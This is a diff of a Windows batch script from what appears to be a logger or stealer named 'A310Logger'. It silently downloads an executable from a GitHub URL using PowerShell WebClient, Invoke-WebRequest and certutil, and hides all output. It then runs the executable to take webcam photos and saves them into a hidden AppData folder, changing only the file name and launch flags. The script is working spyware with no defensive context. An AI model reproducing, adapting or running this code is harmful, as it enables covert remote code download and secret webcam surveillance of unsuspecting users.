@@ -102,8 +102,8 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR2   
 
-   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true', 'WebCamImagesSave.exe')" > nul 2> nul
    )
       if errorlevel 1 goto ERROR2 
 
@@ -172,8 +172,8 @@ echo *************DOWNLOAD file****************
    )   
       if errorlevel 1 goto ERROR3
   
-   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
+   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true?raw=true -OutFile WebCamImagesSave.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
 
@@ -187,8 +187,8 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
-   set url="https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true"
-   set filename="WebCamImageSave.exe"
+   set url="https://github.com/win32u/Licence/blob/main/Extension/WebCamImagesSave.exe?raw=true"
+   set filename="WebCamImagesSave.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
 
@@ -253,8 +253,7 @@ echo *************DOWNLOAD file****************
       set increment=0
       :increment
       timeout 1 > nul
-      
-      start /w "" "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" /S > nul 2> nul
+      "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" > nul 2> nul
       set /a increment=%increment%+1 
       if "%increment%"=="11" goto next
       goto increment
